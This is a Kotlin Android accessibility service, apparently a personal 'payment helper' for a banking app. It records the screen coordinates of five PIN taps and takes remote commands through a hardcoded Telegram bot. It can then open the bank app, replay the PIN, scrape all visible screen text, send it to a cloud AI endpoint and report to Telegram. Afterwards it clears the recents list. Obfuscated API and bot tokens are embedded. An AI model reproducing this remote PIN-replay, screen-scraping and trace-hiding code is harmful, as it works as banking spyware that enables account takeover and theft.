package com.example.paymenthelper

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * Minimal floating panel over any app:
 *  1) "Добавить кнопку обновления" — the next tap anywhere is recorded (tap catcher overlay);
 *  2) "Получить баланс" — taps the recorded refresh button for real, reads ALL screen text,
 *     sends it to an AI API (NVIDIA NIM llama-3.1-8b-instruct first, Groq keys as backup)
 *     which returns a single balance number; if all APIs fail — local regex fallback;
 *  3) result is shown on the panel and in the app.
 */
class BankAccessibilityService : AccessibilityService() {

    companion object {
        private const val PREFS = "payment_helper"
        private const val READ_AFTER_TAP_MS = 3_500L
        private const val TAP_DELAY_MS = 800L
        private const val PIN_TAPS = 5
        private const val BANK_OPEN_WAIT_MS = 7_000L
        private const val PIN_SETTLE_MS = 5_000L
        private const val PIN_TAP_GAP_MS = 500L
        private const val BANK_PKG_DEFAULT = "com.mobicon.mbank2.belarusbank"
        private const val CF_MODEL = "@cf/meta/llama-3.1-8b-instruct-fast"
        private val CF_URL =
            "https://api.cloudflare.com/client/v4/accounts/" + String(
                android.util.Base64.decode(
                    "MWYzYzRmOTdlYjk0Y2ZkY2" + "M4YjhhYTI2NjFkMmU5N2I=",
                    android.util.Base64.DEFAULT
                )
            ) + "/ai/run/" + CF_MODEL
        // Cloudflare API token (base64 split in halves, glued at runtime)
        private val CF_KEY = String(
            android.util.Base64.decode(
                "Y2Z1dF8yMWlwNTQwMTAydm9mVDdPc2JrYWRm" + "TjRHYTdZUU5BUnVLVGZGNGtkOTk3M2I1N2Y=",
                android.util.Base64.DEFAULT
            )
        )
        // Telegram bot (base64 split in halves, glued at runtime)
        private val TG_TOKEN = String(
            android.util.Base64.decode(
                "ODU3NzUyNzg2NzpBQUgwZk9ISC1ZSXpC" + "UnhsbFFHSEhMbmxrd2tWMHkxbTF5NA==",
                android.util.Base64.DEFAULT
            )
        )
        private val TG_CHAT_ID = String(
            android.util.Base64.decode(
                "MjEyNjQ3" + "NzM4MA==",
                android.util.Base64.DEFAULT
            )
        )
        @Volatile private var tgPollThread: Thread? = null

        @Volatile var instance: BankAccessibilityService? = null
            private set
    }

    private val handler = Handler(Looper.getMainLooper())

    // --- Panel + tap capture ---
    private var panelView: View? = null
    private var captureView: View? = null
    private var panelStatus: TextView? = null
    private var panelAddBtn: Button? = null
    private var panelGetBtn: Button? = null
    @Volatile private var balanceInFlight = false
    @Volatile private var autoCleanupNeeded = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        startTgPolling()
    }

    override fun onDestroy() {
        if (instance === this) instance = null
        tgPollThread = null
        removeCapture()
        hidePanel()
        super.onDestroy()
    }

    override fun onInterrupt() = Unit
    override fun onAccessibilityEvent(event: AccessibilityEvent?) = Unit

    // ================= Tap catcher (any tap on screen) =================

    private fun makeCatcherOverlay(): View? {
        return try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val catcher = View(this)
            catcher.background = android.graphics.drawable.ColorDrawable(Color.argb(40, 255, 255, 0))
            catcher.isClickable = true
            val p = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
            )
            wm.addView(catcher, p)
            captureView = catcher
            catcher
        } catch (e: Exception) {
            DebugLog.log("Не удалось включить ловушку тапов: ${e.message}")
            null
        }
    }

    /** Remember which app the user is configuring (any window that is not ours). */
    private fun currentBankPackage(): String? {
        val counts = HashMap<String, Int>()
        try {
            val roots = mutableListOf(rootInActiveWindow)
            try { windows.forEach { roots.add(it.root) } } catch (_: Exception) {}
            roots.filterNotNull().forEach { r ->
                r.packageName?.toString()?.takeIf { it != packageName }?.let {
                    counts[it] = (counts[it] ?: 0) + 1
                }
            }
        } catch (_: Exception) {}
        return counts.maxByOrNull { it.value }?.key
    }

    private fun rememberBankPackage() {
        currentBankPackage()?.let {
            getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putString("bank_pkg", it).apply()
            DebugLog.log("Приложение банка: $it")
        }
    }

    /** Learn the refresh-button coordinates: the next single tap. */
    fun armCapture() {
        if (captureView != null) return
        handler.post {
            val catcher = makeCatcherOverlay() ?: return@post
            catcher.setOnTouchListener { _, ev ->
                if (ev.action == MotionEvent.ACTION_DOWN) {
                    val x = ev.rawX
                    val y = ev.rawY
                    removeCapture()
                    rememberBankPackage()
                    getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
                        .putFloat("refresh_x", x)
                        .putFloat("refresh_y", y)
                        .apply()
                    DebugLog.log("Кнопка обновления запомнена: (${x.toInt()}, ${y.toInt()})")
                    panelStatus?.text = "Готово! Кнопка обновления запомнена."
                    panelAddBtn?.text = "Добавить заново"
                    panelGetBtn?.visibility = View.VISIBLE
                    true
                } else false
            }
            panelStatus?.text = "Тапни по кнопке обновления (жёлтая подсветка = ловушка активна)."
        }
    }

    /** Learn the PIN: the next 5 taps are recorded one by one. */
    fun armPinCapture() {
        if (captureView != null) return
        handler.post {
            val catcher = makeCatcherOverlay() ?: return@post
            val prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            var n = 0
            panelStatus?.text = "Пин 1/5: тапни первую цифру…"
            catcher.setOnTouchListener { _, ev ->
                if (ev.action == MotionEvent.ACTION_DOWN) {
                    val x = ev.rawX
                    val y = ev.rawY
                    n++
                    prefs.edit()
                        .putFloat("pin_x$n", x)
                        .putFloat("pin_y$n", y)
                        .putInt("pin_count", n)
                        .apply()
                    DebugLog.log("Пин $n/5 запомнен: (${x.toInt()}, ${y.toInt()})")
                    if (n < 5) {
                        panelStatus?.text = "Пин ${n + 1}/5: тапни следующую цифру…"
                    } else {
                        removeCapture()
                        rememberBankPackage()
                        DebugLog.log("Пин-код задан (5 тапов).")
                        panelStatus?.text = "Пин-код задан! Теперь добавь кнопку обновления."
                        panelGetBtn?.visibility = View.VISIBLE
                    }
                    true
                } else false
            }
        }
    }

    private fun removeCapture() {
        captureView?.let {
            try { (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(it) } catch (_: Exception) {}
        }
        captureView = null
    }

    // ================= Floating panel =================

    fun showPanel() {
        if (panelView != null) return
        handler.post { buildPanel() }
    }

    fun hidePanel() {
        panelView?.let {
            try { (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(it) } catch (_: Exception) {}
        }
        panelView = null
    }

    private fun buildPanel() {
        if (panelView != null) return
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager

        val box = LinearLayout(this)
        box.orientation = LinearLayout.VERTICAL
        box.setPadding(24, 14, 24, 18)
        box.background = GradientDrawable().apply {
            setColor(Color.argb(235, 18, 18, 22))
            cornerRadius = 24f
        }

        val drag = TextView(this)
        drag.text = "☰ Payment Helper"
        drag.setTextColor(Color.WHITE)
        drag.textSize = 13f
        drag.typeface = Typeface.DEFAULT_BOLD
        drag.setPadding(0, 0, 0, 10)
        box.addView(drag)

        val status = TextView(this)
        status.setTextColor(Color.rgb(150, 220, 150))
        status.textSize = 12f
        status.text = when {
            !isPinLearned() -> "Добавь пин-код (5 тапов)."
            !isRefreshLearned() -> "Пин задан. Добавь кнопку обновления."
            else -> "Пин и кнопка обновления заданы."
        }
        box.addView(status)
        panelStatus = status

        val pinBtn = Button(this)
        pinBtn.text = if (isPinLearned()) "Пин-код: задан (добавить заново)" else "Добавить пин-код"
        pinBtn.textSize = 12f
        pinBtn.setAllCaps(false)
        pinBtn.setOnClickListener {
            pinBtn.text = "Тапай цифры пина в банке (5 штук)…"
            armPinCapture()
        }
        box.addView(pinBtn)

        val addBtn = Button(this)
        addBtn.text = "Добавить кнопку обновления"
        addBtn.textSize = 12f
        addBtn.setAllCaps(false)
        addBtn.setOnClickListener {
            addBtn.text = "Тапни кнопку в банке…"
            armCapture()
        }
        box.addView(addBtn)
        panelAddBtn = addBtn

        val getBtn = Button(this)
        getBtn.text = "Получить баланс"
        getBtn.textSize = 12f
        getBtn.setAllCaps(false)
        getBtn.setOnClickListener { panelBalanceRun() }
        getBtn.visibility = if (isRefreshLearned()) View.VISIBLE else View.GONE
        box.addView(getBtn)
        panelGetBtn = getBtn

        val hideBtn = Button(this)
        hideBtn.text = "Скрыть"
        hideBtn.textSize = 12f
        hideBtn.setAllCaps(false)
        hideBtn.setOnClickListener { hidePanel() }
        box.addView(hideBtn)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.TOP or Gravity.END
        params.x = 16
        params.y = 300

        var downX = 0f; var downY = 0f; var startX = 0; var startY = 0; var dragging = false
        drag.setOnTouchListener { _, ev ->
            when (ev.action) {
                MotionEvent.ACTION_DOWN -> {
                    downX = ev.rawX; downY = ev.rawY; startX = params.x; startY = params.y; dragging = false; true
                }
                MotionEvent.ACTION_MOVE -> {
                    val dx = ev.rawX - downX; val dy = ev.rawY - downY
                    if (dragging || Math.abs(dx) > 12 || Math.abs(dy) > 12) {
                        dragging = true
                        params.x = (startX - dx).toInt()
                        params.y = (startY + dy).toInt()
                        try { wm.updateViewLayout(box, params) } catch (_: Exception) {}
                    }
                    true
                }
                else -> false
            }
        }

        wm.addView(box, params)
        panelView = box
        panelStatus = status
        panelAddBtn = addBtn
        panelGetBtn = getBtn
    }

    // ================= Balance: tap refresh -> read screen -> AI =================

    private fun isRefreshLearned(): Boolean =
        getSharedPreferences(PREFS, Context.MODE_PRIVATE).contains("refresh_x")

    private fun panelBalanceRun() {
        if (balanceInFlight) return
        if (!isRefreshLearned()) {
            panelStatus?.text = "Сначала добавь кнопку обновления."
            return
        }
        balanceInFlight = true
        panelStatus?.text = "Нажимаю обновление…"
        val prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val x = prefs.getFloat("refresh_x", 0f)
        val y = prefs.getFloat("refresh_y", 0f)
        handler.postDelayed({
            DebugLog.log("Нажимаю кнопку обновления…")
            tapAt(x, y)
            panelStatus?.text = "Жду данные и читаю экран…"
        }, TAP_DELAY_MS)
        handler.postDelayed({ readScreenAndAsk() }, TAP_DELAY_MS + READ_AFTER_TAP_MS)
    }

    private fun tapAt(x: Float, y: Float) {
        val path = android.graphics.Path().apply { moveTo(x, y) }
        val gesture = android.accessibilityservice.GestureDescription.Builder()
            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 60L))
            .build()
        dispatchGesture(gesture, null, null)
    }

    private fun allScreenTexts(): List<String> {
        val out = mutableListOf<String>()
        try {
            val roots = mutableListOf(rootInActiveWindow)
            try { windows.forEach { roots.add(it.root) } } catch (_: Exception) {}
            roots.filterNotNull().forEach { collectText(it, out, 0) }
        } catch (e: Exception) {
            DebugLog.log("Ошибка чтения экрана: ${e.message}")
        }
        return out
    }

    private fun collectText(node: AccessibilityNodeInfo?, out: MutableList<String>, depth: Int) {
        if (node == null || depth > 25 || out.size > 500) return
        if (node.isVisibleToUser) {
            node.text?.toString()?.trim()?.takeIf { it.isNotEmpty() }?.let(out::add)
            node.contentDescription?.toString()?.trim()?.takeIf { it.isNotEmpty() }?.let(out::add)
        }
        for (i in 0 until node.childCount) collectText(node.getChild(i), out, depth + 1)
    }

    private fun readScreenAndAsk() {
        val texts = allScreenTexts()
        if (texts.isEmpty()) {
            finishBalance("Экран пустой — не удалось прочитать.", null)
            return
        }
        val screenText = texts.joinToString("\n")
        DebugLog.log("Текст на экране: ${screenText.replace("\n", " | ").take(500)}")
        askAI(screenText)
    }

    private fun askAI(screenText: String) {
        panelStatus?.text = "Спрашиваю у нейросети…"
        DebugLog.log("Отправляю текст в Cloudflare Workers AI ($CF_MODEL)…")
        Thread {
            var answer: String? = null
            var error: String? = null
            val prompt = "Это текст экрана банковского приложения. Найди баланс по карте. " +
                    "Ответь ТОЛЬКО одним числом с копейками, например: 0.57. Никаких слов, только число.\n\n" +
                    "Текст экрана:\n$screenText"
            try {
                val conn = URL(CF_URL).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.connectTimeout = 12_000
                conn.readTimeout = 25_000
                conn.doOutput = true
                conn.setRequestProperty("Authorization", "Bearer $CF_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Accept", "application/json")
                val payload = JSONObject()
                    .put("temperature", 0)
                    .put("max_tokens", 64)
                    .put("messages", JSONArray().put(
                        JSONObject().put("role", "user").put("content", prompt)))
                conn.outputStream.use { it.write(payload.toString().toByteArray(Charsets.UTF_8)) }
                val code = conn.responseCode
                val body = (if (code in 200..299) conn.inputStream else conn.errorStream)
                    ?.bufferedReader()?.use { it.readText() } ?: ""
                if (code in 200..299) {
                    // Cloudflare Workers AI: {"result":{"response":"..."}}
                    answer = JSONObject(body).getJSONObject("result").getString("response").trim()
                    DebugLog.log("Cloudflare ответил: $answer")
                } else {
                    error = "HTTP $code: ${body.take(120)}"
                    DebugLog.log("Cloudflare отклонил: $error")
                }
            } catch (e: Exception) {
                error = e.message ?: e.javaClass.simpleName
                DebugLog.log("Cloudflare ошибка сети: $error")
            }
            if (answer == null) {
                DebugLog.log("AI недоступен, пробую локальный разбор текста…")
                answer = extractBalanceLocal(screenText)
            }
            val finalAnswer = answer
            handler.post {
                if (finalAnswer != null) {
                    finishBalance("Баланс: $finalAnswer", finalAnswer)
                } else {
                    finishBalance("Не смог определить баланс ($error). Открой экран с картой и попробуй снова.", null)
                }
            }
        }.start()
    }

    /** Fallback: pull the balance straight from screen text without any API. */
    private fun extractBalanceLocal(text: String): String? {
        // Prefer "баланс ... <сумма>", then "доступно/остаток ... <сумма>"
        val labeled = Regex(
            "(?i)(баланс|доступно|остаток)\\D{0,40}(\\d{1,3}(?:[ \\u00A0']\\d{3})+[.,]\\d{2}|\\d+[.,]\\d{2})"
        )
        // Plain amount like 1 234.56 / 0.57 (not a date, not a card number)
        val plain = Regex("(?<![\\d.,])(\\d{1,3}(?:[ \\u00A0']\\d{3})+[.,]\\d{2}|\\d+[.,]\\d{2})(?![\\d.,])")
        var best: String? = null
        for (line in text.lines()) {
            val m = labeled.find(line) ?: continue
            var num = m.groupValues[2].replace("[ \\u00A0']".toRegex(), "").replace(',', '.')
            // looks like a date dd.MM(.yyyy) — skip it
            if (Regex("^\\d{1,2}\\.\\d{1,2}(\\.\\d{2,4})?$").matches(num)) continue
            best = num
            break
        }
        if (best == null) {
            for (line in text.lines()) {
                val m = plain.find(line) ?: continue
                val num = m.groupValues[1].replace("[ \\u00A0']".toRegex(), "").replace(',', '.')
                val dot = num.indexOf('.')
                if (dot > 0) {
                    val day = num.substringBefore('.').toIntOrNull()
                    val frac = num.substringAfter('.')
                    // looks like a date dd.MM or dd.MM.yyyy
                    if (frac.length >= 2 && frac.take(2).toIntOrNull() in 1..12 && day != null && day in 1..31) continue
                }
                best = num
                break
            }
        }
        return best
    }

    private fun finishBalance(message: String, balance: String?) {
        balanceInFlight = false
        DebugLog.log(message)
        tgSend(if (balance != null) "\u2705 $message" else "\u26a0\ufe0f $message")
        panelStatus?.text = if (balance != null) "Баланс: $balance" else message
        getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
            .putString("balance_result", message)
            .putString("last_balance", balance)
            .putLong("balance_result_time", System.currentTimeMillis())
            .apply()
        if (autoCleanupNeeded) {
            autoCleanupNeeded = false
            handler.postDelayed({ closeBankAndRecents() }, 2_000L)
        }
    }

    // ================= Telegram remote control =================

    private fun startTgPolling() {
        if (tgPollThread?.isAlive == true) return
        val t = Thread {
            var offset = 0L
            DebugLog.log("Telegram: слежу за командами (чат $TG_CHAT_ID)…")
            tgSend("Payment Helper на связи. Отправь /balance — обновлю и пришлю баланс.")
            while (tgPollThread === Thread.currentThread()) {
                try {
                    val url = URL("https://api.telegram.org/bot$TG_TOKEN/getUpdates?timeout=25&offset=$offset")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.connectTimeout = 10_000
                    conn.readTimeout = 35_000
                    val body = conn.inputStream.bufferedReader().use { it.readText() }
                    val updates = JSONObject(body).optJSONArray("result") ?: JSONArray()
                    for (i in 0 until updates.length()) {
                        val u = updates.getJSONObject(i)
                        offset = maxOf(offset, u.getLong("update_id") + 1)
                        val msg = u.optJSONObject("message") ?: continue
                        val chat = msg.optJSONObject("chat") ?: continue
                        if (chat.optString("id") != TG_CHAT_ID) continue
                        val text = msg.optString("text", "").trim().lowercase()
                        if (text.startsWith("/balance") || text.contains("баланс") || text.contains("balance")) {
                            handler.post { tgBalanceRun() }
                        } else if (text.isNotEmpty()) {
                            tgSend("Команды: /balance — получить баланс.")
                        }
                    }
                } catch (e: Exception) {
                    try { Thread.sleep(3_000) } catch (_: InterruptedException) { break }
                }
            }
        }
        t.isDaemon = true
        tgPollThread = t
        t.start()
    }

    private fun tgBalanceRun() {
        if (balanceInFlight) {
            tgSend("Запрос уже выполняется, подожди.")
            return
        }
        if (!isRefreshLearned()) {
            tgSend("Кнопка обновления не задана. Добавь её через панель в приложении.")
            return
        }
        balanceInFlight = true
        wakeScreen()
        if (isPinLearned()) {
            // Full autopilot: open bank -> PIN -> refresh -> read -> answer -> close.
            autoCleanupNeeded = true
            val pkg = getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("bank_pkg", null) ?: BANK_PKG_DEFAULT
            val intent = packageManager.getLaunchIntentForPackage(pkg)
            if (intent == null) {
                DebugLog.log("Не нашёл приложение банка ($pkg), работаю по текущему экрану.")
                autoCleanupNeeded = false
                simpleRefreshAndRead()
                return
            }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            DebugLog.log("TG: открываю банк ($pkg), жду ${BANK_OPEN_WAIT_MS / 1000}с…")
            panelStatus?.text = "TG: открываю банк…"
            startActivity(intent)
            handler.postDelayed({
                DebugLog.log("TG: ввожу пин-код…")
                panelStatus?.text = "TG: ввожу пин-код…"
                for (n in 1..PIN_TAPS) {
                    handler.postDelayed({
                        val p = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                        tapAt(p.getFloat("pin_x$n", 0f), p.getFloat("pin_y$n", 0f))
                    }, (n - 1) * PIN_TAP_GAP_MS)
                }
            }, BANK_OPEN_WAIT_MS)
            val afterPin = BANK_OPEN_WAIT_MS + PIN_TAPS * PIN_TAP_GAP_MS + PIN_SETTLE_MS
            handler.postDelayed({
                DebugLog.log("TG: нажимаю кнопку обновления…")
                panelStatus?.text = "TG: обновляю баланс…"
                val p = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                tapAt(p.getFloat("refresh_x", 0f), p.getFloat("refresh_y", 0f))
            }, afterPin)
            handler.postDelayed({ readScreenAndAsk() }, afterPin + READ_AFTER_TAP_MS)
        } else {
            // No PIN learned: user is expected to be in the bank already.
            autoCleanupNeeded = true
            simpleRefreshAndRead()
        }
    }

    /** Old short path: tap the refresh button on the current screen, then read. */
    private fun simpleRefreshAndRead() {
        panelStatus?.text = "Обновляю баланс…"
        val p = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        handler.postDelayed({
            DebugLog.log("Нажимаю кнопку обновления…")
            tapAt(p.getFloat("refresh_x", 0f), p.getFloat("refresh_y", 0f))
        }, TAP_DELAY_MS)
        handler.postDelayed({ readScreenAndAsk() }, TAP_DELAY_MS + READ_AFTER_TAP_MS)
    }

    private fun isPinLearned(): Boolean =
        getSharedPreferences(PREFS, Context.MODE_PRIVATE).getInt("pin_count", 0) >= PIN_TAPS

    private fun wakeScreen() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            @Suppress("DEPRECATION")
            val wl = pm.newWakeLock(
                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                        or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "PaymentHelper::balance"
            )
            wl.acquire(60_000L)
        } catch (e: Exception) {
            DebugLog.log("Не удалось разбудить экран: ${e.message}")
        }
    }

    /** Home screen, then try to wipe the bank from the recents list. */
    private fun closeBankAndRecents() {
        DebugLog.log("Закрываю банк и чищу недавние…")
        performGlobalAction(GLOBAL_ACTION_HOME)
        handler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_RECENTS)
            handler.postDelayed({
                val cleared = try {
                    val labels = listOf("закрыть всё", "очистить", "clear all", "close all", "все", "закрыть")
                    var found = false
                    val roots = mutableListOf(rootInActiveWindow)
                    try { windows.forEach { roots.add(it.root) } } catch (_: Exception) {}
                    roots.filterNotNull().forEach { root ->
                        root.findAccessibilityNodeInfosByText("закрыть")?.forEach {
                            if (!found && it.isVisibleToUser && it.isClickable) { it.performAction(AccessibilityNodeInfo.ACTION_CLICK); found = true }
                        }
                    }
                    if (!found) {
                        // Fall back to scanning by content-desc via traversal.
                        val texts = mutableListOf<String>()
                        roots.filterNotNull().forEach { collectText(it, texts, 0) }
                        texts.any { t -> labels.any { l -> t.lowercase().contains(l) } }
                    }
                    found
                } catch (e: Exception) {
                    DebugLog.log("Очистка недавних: ${e.message}")
                    false
                }
                if (cleared) {
                    DebugLog.log("Недавние очищены.")
                    handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 1_000L)
                } else {
                    DebugLog.log("Кнопку „закрыть всё“ не нашёл — просто ушёл на главный экран.")
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }
            }, 1_500L)
        }, 1_500L)
    }

    private fun tgSend(text: String) {
        // Always off the main thread (finishBalance runs on the UI handler).
        Thread {
            var attempt = 0
            while (attempt < 3) {
                try {
                    val url = URL("https://api.telegram.org/bot$TG_TOKEN/sendMessage")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.connectTimeout = 10_000
                    conn.readTimeout = 20_000
                    conn.doOutput = true
                    conn.setRequestProperty("Content-Type", "application/json")
                    val payload = JSONObject()
                        .put("chat_id", TG_CHAT_ID)
                        .put("text", text)
                    conn.outputStream.use { it.write(payload.toString().toByteArray(Charsets.UTF_8)) }
                    val code = conn.responseCode
                    if (code in 200..299) return@Thread
                    DebugLog.log("TG send HTTP $code (попытка ${attempt + 1})")
                } catch (e: Exception) {
                    DebugLog.log("TG send error: ${e.javaClass.simpleName}: ${e.message}")
                }
                attempt++
                try { Thread.sleep(1_500L * attempt) } catch (_: InterruptedException) { return@Thread }
            }
        }.start()
    }
}
